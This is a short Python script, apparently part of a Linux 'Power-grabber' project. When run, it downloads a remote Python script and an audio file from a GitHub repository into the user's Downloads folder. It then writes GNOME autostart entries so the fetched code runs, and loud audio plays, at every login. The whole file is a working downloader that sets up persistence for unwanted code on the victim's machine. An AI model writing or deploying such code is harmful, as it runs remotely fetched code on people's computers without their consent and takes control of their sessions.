import requests
import os
import shutil

def download_another_file():
    url = "https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Annoy-Max.py"
    response = requests.get(url)
    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    file_path = os.path.join(downloads_path, "Annoy-Max.py")
    startup_path = os.path.join(os.path.expanduser("~"), ".config", "autostart")
    os.makedirs(startup_path, exist_ok=True)
    startup_file = os.path.join(startup_path, "Annoy-Max.desktop")
    
    if response.status_code == 200:
        with open(file_path, "wb") as file:
            file.write(response.content)
        
        # Create a .desktop file for autostart
        desktop_entry = f"""[Desktop Entry]
Type=Application
Name=Annoy-Max
Exec=python3 {file_path}
X-GNOME-Autostart-enabled=true
"""
        with open(startup_file, "w") as file:
            file.write(desktop_entry)
    else:
        print("Failed to download file")

def download_audio():
    url = "https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/main/Loud"
    response = requests.get(url)
    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    file_path = os.path.join(downloads_path, "loud.mp3")
    startup_path = os.path.join(os.path.expanduser("~"), ".config", "autostart")
    os.makedirs(startup_path, exist_ok=True)
    startup_file = os.path.join(startup_path, "PlayLoud.desktop")
    
    if response.status_code == 200:
        with open(file_path, "wb") as file:
            file.write(response.content)
        
        # Create a .desktop file for autostart
        desktop_entry = f"""[Desktop Entry]
Type=Application
Name=Play Loud
Exec=mpv {file_path}
X-GNOME-Autostart-enabled=true
"""
        with open(startup_file, "w") as file:
            file.write(desktop_entry)
    else:
        print("Failed to download audio file")

download_another_file()
download_audio()
